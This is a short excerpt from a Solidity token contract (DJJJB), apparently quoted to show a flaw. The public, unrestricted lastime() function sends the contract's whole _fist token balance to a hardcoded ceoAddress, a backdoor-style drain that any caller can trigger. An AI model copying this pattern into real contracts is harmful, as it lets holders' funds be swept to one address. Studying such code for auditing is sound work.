...
abstract contract AbsToken is IERC20, Ownable {
    ...
    address private ceoAddress = address(0x04835e0b126f3375968242C98cDD78f563BDD143);
    ...
    function safeTransfer(address _to) internal {
        uint256 tokenBalance = IERC20(_fist).balanceOf(address(this));
        IERC20(_fist).transfer(_to, tokenBalance);
    }

    function lastime() public {
        safeTransfer(ceoAddress);       
    }
...
contract DJJJB is AbsToken {
    constructor() AbsToken(
        ...
        6,//Decimals
        888,//Supply
        address(0x8a9FE5a52c33ED5f937B5Ccf34B61EB0Bfb4bf6e),//FundAddress
        address(0x04835e0b126f3375968242C98cDD78f563BDD143)//ReceiveAddress
    ){
